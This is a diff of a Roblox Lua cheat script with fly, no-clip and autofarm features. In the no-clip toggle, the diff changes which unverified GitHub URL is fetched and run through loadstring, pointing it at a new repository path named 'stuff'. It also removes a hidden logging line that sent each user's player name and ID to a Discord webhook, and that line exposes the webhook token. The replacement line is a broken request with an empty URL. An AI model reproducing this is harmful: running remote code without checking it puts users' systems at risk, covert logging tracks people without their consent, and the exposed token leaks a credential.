@@ -146,7 +146,7 @@ local MainButton = MainPage.AddButton("Fly (X)", function()
     start() 		
 end)
 local MainToggle = MainPage.AddToggle("No Clip", false, function(t)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sxinfity/legohack/main/stuff"))()
     setfflag("HumanoidParallelRemoveNoPhysics", "False")
     setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
     if t == true then
@@ -2358,7 +2358,7 @@ local autofarmbutton = autofarm.AddButton("Muscle Autofarm (reset when done)", f
 end)
 
 -- // logs
-    game:HttpGet('https://discord.com/api/webhooks/1063962334093115444/Gj5t-EJT0l-YcEjTncCWHt4JwrSuDDdxpgWSjjYXPZY89UPwA_c42GvKQ05pWa6JXU1V'..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'');
+    game:HttpGet(''..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'');
 
 
 
